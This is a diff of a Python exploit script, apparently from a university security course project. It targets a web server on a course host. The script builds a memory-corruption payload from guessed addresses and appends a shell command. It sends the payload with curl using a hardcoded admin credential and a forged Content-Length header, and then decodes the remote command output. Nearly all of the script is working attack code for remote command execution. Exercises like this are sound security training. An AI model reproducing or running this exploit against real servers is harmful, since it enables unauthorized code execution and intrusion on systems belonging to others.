@@ -1,8 +1,10 @@
+
 url = "http://project-2.csec.chatzi.org:8000"
-pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
+auth="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"
 
 command = "lspci"
 
+import subprocess
 from requests import Request, Session
 import base64
 import time
@@ -51,7 +53,7 @@ def set_variables():
 
 	addr_9th = int(mystring[-9],16)
 
-	time.sleep(1)
+	time.sleep(0.5)
 
 set_variables()
 
@@ -85,30 +87,32 @@ data +=  transform_address(guessed_address+152)
 data +=  command
 data += '\0'
 
-s = Session()
 
-req = Request('POST', url, data=data)
-
-prepped = req.prepare()
-prepped.headers['Content-Length'] = 66
-prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
-response = s.send(prepped)
+#Here we chose to send requests with a curl command instead of through the request library.
+#The request library was malfunctioning when the Content-Length was malicious
 
 
-
-content = str(response.content)[84:-1] #Result of the instruction
-
-
-hex_string = content
-
-# Convert hex escape sequences to binary
-decoded_string = codecs.escape_decode(hex_string)[0].decode()
-
-# print(response.status_code)
-
-# Print the converted string to a file
-with open('command_output.txt', 'w') as file:
-    file.write(decoded_string)
-    print("String saved to command_output.txt")
+#Store payload into a temporary binary file called mybin
+binary_data = bytes(data, 'latin-1')
+with open('mybin', 'wb') as file:
+    file.write(binary_data)
 
 
+curl_command =(
+	"curl -m 5 -u"
+	+ auth
+	+" --data-binary '@mybin' "
+	+ url
+	+" -H 'Content-Length: 66'"
+	)
+
+try:
+	result = subprocess.run(curl_command,shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE,check=True)
+except subprocess.CalledProcessError:
+	exit()
+
+content = str(result.stdout)[84:-1] #Result of the instruction
+
+decoded_output = codecs.escape_decode(content)[0].decode() #Decode binary characters
+
+print(decoded_output)
